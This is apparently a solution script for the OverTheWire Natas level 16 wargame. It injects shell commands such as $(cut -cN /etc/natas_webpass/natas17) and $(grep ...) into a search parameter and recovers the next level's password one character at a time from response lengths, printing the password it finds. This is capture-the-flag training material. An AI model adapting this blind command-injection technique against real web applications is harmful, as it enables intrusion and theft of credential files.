# linux terminal command injection used: $(cut -cN /etc/natas_webpass/natas17) where N is the nth letter of the natas17 password file


import requests

with open("passwords.txt") as f:
    n16_pass = f.read().splitlines()[16].split(":")[1]

# PART 1 ---------------------------------------------------------------------------------------------------------------

password_letters = ['e', 'q']

for current_char in range(3,33):  # starting from 3 because I already got first 2 and the second one was causing me problems
    url = f"http://natas16.natas.labs.overthewire.org/?needle=%24%28cut+-c{current_char}+%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search"

    response = requests.get(url, auth=('natas16', n16_pass))

    word_list = response.text.split("<pre>\n")[1].splitlines() # <pre> is the last tag before the actual dictionary return result starts

    if len(word_list) < 20:  # incase it's a number
        password_letters.append("<NUM>")
        print("Current Iteration: ", current_char, "(Number Found!)")
        continue

    print("Current Iteration: ", current_char)

    common_char = set(word_list[0].lower())
    word_no = 1
    while len(common_char) != 1:
        word = set(word_list[word_no].lower())
        common_char = common_char.intersection(word)

        word_no += 1

    password_letters.append(common_char.pop())

print("Password letters: ", ''.join(password_letters), end="\n\n")

# gives us "eqjhjbo<NUM>lfnb<NUM>vwhhb<NUM>s<NUM><NUM>hokh<NUM>tf<NUM>oc"


# so we found all the password letters, now we need to find their cases, so we will use $(grep <LETTER> /etc/natas_webpass/natas17), <LETTER. is all our password_letters letters
# if the result is empty, that means grep found that exact (case-sensitive) match in the password file, thats why the return result from dictionary is empty
# but if it didn't, it returns the whole dictionary, because for some reason if we enter '' into the search it returns the whole dictionary

# PART 2 (finds case correct letters) ----------------------------------------------------------------------------------

password_letters = ['e', 'q', 'j', 'h', 'j', 'b', 'o', '<NUM>', 'l', 'f', 'n', 'b', '<NUM>', 'v', 'w', 'h', 'h', 'b', '<NUM>', 's', '<NUM>', '<NUM>', 'h', 'o', 'k', 'h', '<NUM>', 't', 'f', '<NUM>', 'o', 'c']

def check_for_grep_return(alphanum_to_check): # checks if grep returned a value or not
    url_to_check = f"http://natas16.natas.labs.overthewire.org/?needle=%24%28grep+{alphanum_to_check}+%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search"
    check_response = requests.get(url_to_check, auth=('natas16', n16_pass))

    if len(check_response.text) == 1105: #1105 was found by manual testing of response, 1105 is when nothing is returned (i.e a grep match was found) and 461926 is when the whole dictionary is returned (no grep match found)
        return True
    return False


final_password_letters = []

for letter_check1 in password_letters:

    if letter_check1 == "<NUM>":
        final_password_letters.append(letter_check1)
        continue
    letter_check2 = chr(ord(letter_check1) - 32) # getting the uppercase letter

    if check_for_grep_return(letter_check1):
        final_password_letters.append(letter_check1)
    final_password_letters.append(letter_check2)

    print("Password Letter Found!")

print("Case-sensitive Password Letters:", ''.join(final_password_letters), end="\n\n")

# gives us "Eqjhjbo<NUM>LFNb<NUM>vwhhb<NUM>s<NUM><NUM>hokh<NUM>TF<NUM>oC"


# PART 3 We need to find numbers --------------------------------------------------------------------------

final_password_letters = ['E', 'q', 'j', 'h', 'j', 'b', 'o', '<NUM>', 'L', 'F', 'N', 'b', '<NUM>', 'v', 'w', 'h', 'h', 'b', '<NUM>', 's', '<NUM>', '<NUM>', 'h', 'o', 'k', 'h', '<NUM>', 'T', 'F', '<NUM>', 'o', 'C']

# through manual testing, I have found out that the natas17 password contains numbers 0,5,7,8 and 9 [using the command $(grep <NUM> /etc/natas_webpass/natas17)]

# the method we will use is to use that we will first echo out the characters where numbers are present to a temporary file directory (/tmp/thisismytemp.txt) and then grep that file to see if it contains any of the possible 5 numbers
# like before, it will return the whole dictionary if not present, else nothing, that's what we're aiming for


possible_numbers = [0, 5, 7, 8, 9]

number_positions = [8, 13, 19, 21, 22, 27, 30] # remember these are 1 more than the index value in the password_letters list due to linux file indices being 1-indexed

for number in number_positions:
    url = f"http://natas16.natas.labs.overthewire.org/?needle=%24%28echo+%24%28cut+-c{number}+%2Fetc%2Fnatas_webpass%2Fnatas17%29+%3E+%2Ftmp%2Fthisismytemp.txt%29&submit=Search"
    requests.post(url, auth=('natas16', n16_pass))

    for possible_number in possible_numbers:
        check_url = f"http://natas16.natas.labs.overthewire.org/?needle=%24%28grep+{possible_number}+%2Ftmp%2Fthisismytemp.txt%29&submit=Search"
        response = requests.get(check_url, auth=('natas16', n16_pass))

        if len(response.text) == 1105:
            final_password_letters[number-1] = str(possible_number)
            print("Number Found!")
            break

print("Password with correct numbers:", ''.join(final_password_letters))

# gives us "Eqjhjbo7LFNb8vwhhb9s75hokh5TF0oC"

# PART 4 (i messed up, part 2 is not perfect, theres a lot of holes for the found letter to not be the correct case, this part will fix it)

final_password_letters = ['E', 'q', 'j', 'h', 'j', 'b', 'o', '7', 'L', 'F', 'N', 'b', '8', 'v', 'w', 'h', 'h', 'b', '9', 's', '7', '5', 'h', 'o', 'k', 'h', '5', 'T', 'F', '0', 'o', 'C']

for letter in range(len(final_password_letters)):
    letter_to_check = final_password_letters[letter]

    if ord(letter_to_check) < 97:
        continue

    extract_letter_url = f"http://natas16.natas.labs.overthewire.org/?needle=%24%28echo+%24%28cut+-c{letter+1}+%2Fetc%2Fnatas_webpass%2Fnatas17%29+%3E+%2Ftmp%2Fthisismytemp.txt%29&submit=Search"
    requests.post(extract_letter_url, auth=('natas16', n16_pass))

    check_letter_url = f"http://natas16.natas.labs.overthewire.org/?needle=%24%28grep+{letter_to_check}+%2Ftmp%2Fthisismytemp.txt%29&submit=Search"
    response = requests.get(check_letter_url, auth=('natas16', n16_pass))

    if len(response.text) == 461926: # have to use the 461926 full dictionary length here instead of 1105 because the length on a successful find this time is variable, according to the number of dictionary words that contain that specific letter, ex: q, or b, so 1105 not reliable
        final_password_letters[letter] = chr(ord(letter_to_check) - 32)
        print("Accurate Case Character Found!")

print("\n\nNatas17 Final Password:", ''.join(final_password_letters))

# gives us "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC"
